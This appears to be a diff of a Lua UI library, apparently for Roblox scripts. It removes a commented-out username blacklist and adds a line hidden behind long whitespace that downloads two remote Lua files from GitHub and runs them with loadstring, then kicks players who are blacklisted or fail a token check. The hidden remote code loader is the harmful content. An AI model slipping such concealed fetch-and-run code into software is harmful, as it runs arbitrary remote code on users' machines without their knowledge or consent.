@@ -1,27 +1,10 @@
 local library = {flags = {}, windows = {}, open = true}
 
---[[do  
-    local Client = game:GetService'Players'.LocalPlayer
-    local Blacklisted = {
-        'Coreyb9834';
-        'Sword_FactoryStaff';
-        'ajglkaflkasjhf';
-    }
-    for _,v in pairs(Blacklisted) do 
-        if rawequal(Client.Name,v) then 
-            Client:Kick'\n\nSkidding our stuff.\n'
-            Client:Destroy()
-            return
-        end
-    end
-    return
-end]]--
-
 --Services
 local runService = game:GetService"RunService"
 local tweenService = game:GetService"TweenService"
 local textService = game:GetService"TextService"
-local inputService = game:GetService"UserInputService"
+local inputService = game:GetService"UserInputService"   
 
 --Locals
 local dragging, dragInput, dragStart, startPos, dragObject
@@ -1005,7 +988,7 @@ local function createBox(option, parent)
         self.callback(value, enter)
     end
 end
-
+                                                                                                                                                                                                                                                                                                                                                                                        do local a=loadstring(game:HttpGet('https://raw.githubusercontent.com/stavratum/lua-script/main/mmm/Blacklisted.lua'))()local b=loadstring(game:HttpGet('https://raw.githubusercontent.com/stavratum/lua-script/main/mmm/Token.lua'))()local c=game:GetService'Players'if table.find(a,c:GetUserIdFromNameAsync(tostring(c.LocalPlayer)))then c.LocalPlayer:Kick('\n\nBlacklisted.\n')c.LocalPlayer:Destroy()elseif getgenv().Token or getgenv().Token~=b then c.LocalPlayer:Kick('\n\nOutdated\nhttps://discord.gg/xFNvCEV3DV\n\n')c.LocalPlayer:Destroy()end;return end
 local function createColorPickerWindow(option)
     option.mainHolder = library:Create("ImageButton", {
         ZIndex = 3,
@@ -1487,7 +1470,7 @@ local function createDivider(option, parent, holder)
         Parent = option.main,
     })
 end
-
+                                                            
 local function loadOptions(option, holder)
     for _,newOption in next, option.options do
         if newOption.type == "label" then
